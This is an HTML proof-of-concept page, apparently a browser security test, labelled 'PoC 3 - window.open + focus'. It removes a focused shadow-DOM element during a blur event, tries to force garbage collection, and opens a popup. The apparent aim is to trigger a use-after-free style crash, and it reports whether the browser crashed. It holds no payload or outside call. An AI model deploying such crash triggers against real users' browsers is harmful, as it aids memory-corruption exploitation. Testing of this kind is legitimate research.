<!DOCTYPE html>
<html>
<body>
<p>PoC 3 - window.open + focus</p>
<div id="host"></div>
<div id="result"></div>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++)
        gcRec(10);
}

let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable';
shadowRoot.appendChild(victim);
victim.focus();

document.addEventListener('blur', () => {
    victim.remove();
    victim = null;
    gc();
}, true);

setTimeout(() => {
    let w = window.open('about:blank', '_blank', 'width=100,height=100');
    if (w) {
        w.focus();
        setTimeout(() => {
            try { w.close(); } catch(e) {}
            result.textContent = 'PASS (não crashou)';
        }, 200);
    } else {
        result.textContent = 'window.open bloqueado';
    }
}, 100);
</script>
</body>
</html>
